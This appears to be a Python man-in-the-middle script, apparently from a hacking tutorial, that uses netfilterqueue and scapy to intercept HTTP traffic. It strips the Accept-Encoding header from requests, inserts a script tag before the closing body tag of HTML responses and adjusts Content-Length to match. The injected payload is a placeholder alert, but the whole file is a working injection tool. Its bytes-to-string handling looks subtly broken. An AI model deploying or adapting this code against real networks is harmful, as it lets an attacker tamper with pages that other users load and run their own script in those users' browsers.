import netfilterqueue
import scapy.all as scapy
import re


def set_load(sp,load):

    sp[scapy.Raw].load = load
                
    del sp[scapy.IP].len
    del sp[scapy.IP].chksum
    del sp[scapy.TCP].chksum

    return sp

def process_packet(packet):
    sp = scapy.IP(packet.get_payload())
    if sp.haslayer(scapy.Raw):
        if sp[scapy.TCP].dport == 80:
            print ("{+} HTTP Request > ")
            mod_load = re.sub("Accept-Encoding:.*?\\r\\n", "", str(sp[scapy.Raw].load))
            np = set_load(sp,mod_load)
            packet.set_payload(bytes(np))
            #print sp.show()
        elif sp[scapy.TCP].sport == 80:
            #print "{+} HTTP Reponse > "
            injection_code = "<script>alert('Test');</script>"
            mod_load = str(sp[scapy.Raw].load).replace("</body>",injection_code + "</body>")
            csl = re.search("(?:Content-Length:\s)(\d*)",str(mod_load))
            if csl and ("text/html" in mod_load):
                cl = csl.group(1)
                print (cl)
                new_cl = int(cl) + len(injection_code) 
                print (new_cl)
                mod_load = mod_load.replace(cl,str(new_cl))
            np = set_load(sp, mod_load)
            packet.set_payload(bytes(np))
            #print sp.show()
    packet.accept()

q = netfilterqueue.NetfilterQueue()
q.bind(0, process_packet)
q.run()


